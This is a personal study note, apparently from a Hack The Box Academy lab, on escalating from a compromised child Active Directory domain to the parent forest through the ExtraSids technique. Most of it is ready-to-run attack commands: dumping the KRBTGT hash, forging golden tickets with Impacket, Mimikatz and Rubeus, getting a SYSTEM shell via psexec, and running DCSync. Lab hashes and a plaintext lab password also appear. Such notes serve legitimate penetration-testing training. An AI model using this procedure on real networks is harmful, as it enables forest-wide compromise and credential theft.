## ExtraSids Attack - Mimikatz

This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected due to a lack of [SID Filtering](https://web.archive.org/web/20220812183844/https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection. 

SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. 
 [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) . # Steal or Forge Kerberos Tickets: Golden Ticket
## ExtraSids Attack 
To perform this attack after compromising a child domain, we need the following:
- [ ] Compromised the child domain
- [ ] The KRBTGT hash for the child domain
- [ ] The SID for the child domain
- [ ] The name of a target user in the child domain (does not need to exist!)
- [ ] The FQDN of the child domain.
- [ ] The SID of the Enterprise Admins group of the root domain.
- [ ] With this data collected, the attack can be performed

## Scenario
we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.

---
## Extra Sids in Linux:
## Automatic with raisechild.py
We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest.
```shell-session
$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
```


## Manual Method
- step1: grab NTLM Hash of KRBTGT in child domain:
```shell-session
$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```

perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. 
- step2: grab sid of child domain
```shell-session
$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
pw:

[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268
```

- step3: grab SID of enterprise admins in the parent domain by combining sid of domain + group rid
```shell
impacket-lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114

519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

becomes:
```
S-1-5-21-3842939050-3880317879-2865463114-519
```

- last step: forge ticket:
#### Constructing a Golden Ticket using ticketer.py

use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`).
```shell-session
$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

The ticket will be saved down to our system as a [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.
```shell-session
$ export KRB5CCNAME=hacker.ccache 
```
#### Getting a SYSTEM shell using Impacket's psexec.py
```shell-session
$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01
```
### From windows:
- step1: grab NTLM Hash of KRBTGT in child domain:
 `Obtaining the KRBTGT Account's NT Hash and child domain's sid using Mimikatz`
 ```powershell-session
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
![[Pasted image 20250727234723.png]]
from the output: copy the domain part of the SID and NTLM hash of krbtgt.

Also get sid with powerview
```powershell-session
PS C:\htb> Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

- STEP 2. 
Get Sid of the Enterprise Admins group from the parent domain
use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. 
 `Obtaining Enterprise Admins Group's SID using Get-DomainGroup
```powershell-session
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

We could also do this with the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet with a command such as
```
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`.
```

- STEP3 perform the attack
```powershell-session
mimikatz # kerberos::golden /user:hacker /domain:<child.domain.local> /sid:<child-domain-sid> /krbtgt:9d765b482771505cbe97411065964d5f /sids:<root-domain-entrpriseadmins-sid> /ptt
```

example:
```powershell-session
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

`Confirming a Kerberos Ticket is in Memory Using klist`
```powershell-session
PS C:\htb> klist

Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)
        Renew Time: 3/25/2032 19:59:50 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.


`test if you  can access c$ in root domain's DC`
```powershell-session
ls \\academy-ea-dc01.inlanefreight.local\c$
```
## ExtraSids with Rubeas
Next, we will formulate our Rubeus command using the data we retrieved above. The `/rc4` flag is the NT hash for the KRBTGT account. The `/sids` flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.
```powershell-session
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
![[Pasted image 20250728000343.png]]
```powershell-session
PS C:\htb> klist
```


- Final step in the attack path: DCSync via the forged golden ticket
### EXPLOITING GOLDEN TICKET TO DCSync


if the user is  in the same domain:
```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : lab_adm

** SAM ACCOUNT **

SAM Username         : lab_adm
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/27/2022 10:53:21 PM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6
```


When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller.
`specify target domain`
```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

# Background/Introduction
![[Pasted image 20250728000751.png]]
Essentially combined with extrasids we're creating a ticket that has the sid of Enterprise Admins

The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

Using Mimikatz or rubeas, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.

This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a [Golden Ticket](GOLDEN%20TICKET.md)

 [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

### Understanding SIDS 

A SID is a single, variable-length value. However, it is structured in a way that conceptually allows us to identify two main parts:
1. **The Domain SID:**
    
    - This is the initial part of the SID.
        
    - It is unique to a security domain. Every security principal (user, group, computer, etc.) that belongs to the same domain will share the same Domain SID portion.
        
    - It identifies the scope of the security realm the SID is valid within.
        
    - **Structure:** Typically, it starts with S-1-5-21 followed by three sub-authority values. For instance, S-1-5-21-3286968501-24975625-1618430583.
        
2. **The Relative Identifier (RID):**
    
    - This is the final part of the SID.
        
    - It is unique within the scope of the domain defined by the Domain SID.
        
    - It identifies the specific security principal (user, group, computer, etc.).
        
    - **Structure:** It's a single integer value. Examples include: 500 (for the built-in Administrator account), 512 (for the Domain Admins group), or any other numerical value assigned by the domain for that entity.

-------------
### **How These Parts Work Together**

The full SID is formed by concatenating the Domain SID and the RID, usually with a dash - in between.  
The RID is appended to the domain SID as a new sub-authority in the SID.

- **Example Full User SID:** S-1-5-21-3286968501-24975625-1618430583-500
    
    - Domain SID: S-1-5-21-3286968501-24975625-1618430583
        
    - RID: 500
        
- **Example Full Group SID:** S-1-5-21-3286968501-24975625-1618430583-512
    
    - Domain SID: S-1-5-21-3286968501-24975625-1618430583
        
    - RID: 512



# FOREST TRUSTS
```powershell-session
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```




## SID History Abuse - Cross Forest
SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. In the below diagram, we can see an example of the `jjones` user being migrated from the `INLANEFREIGHT.LOCAL` domain to the `CORP.LOCAL` domain in a different forest. If SID filtering is not enabled when this migration is made and the user has administrative privileges (or any type of interesting rights such as ACE entries, access to shares, etc.) in the `INLANEFREIGHT.LOCAL` domain, then they will retain their administrative rights/access in `INLANEFREIGHT.LOCAL` while being a member of the new domain, `CORP.LOCAL` in the second forest.



--------------
#### run bloodhound

```shell-session
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

zip output to 1 file
```shell-session
zip -r ilfreight_bh.zip *.json
```

check  users with foreign group membership under Dangerous rights
## Closing Thoughts on Trusts

As seen in the past few sections, there are several ways to leverage domain trusts to gain additional access and even do an "end-around" and escalate privileges in our current domain. For example, we can take over a domain that our current domain has a trust with, and find password re-use across privileged accounts. We've seen how Domain Admin rights in a child domain nearly always mean we can escalate privileges and compromise the parent domain using the ExtraSids attack. Domain trusts are a rather large and complex topic. The primer in this module has given us the tools to enumerate trusts and perform some standard intra-forest and cross-forest attacks. 

look for users with spn in different domain/foresrt
```shell-session
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

```
psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238
```
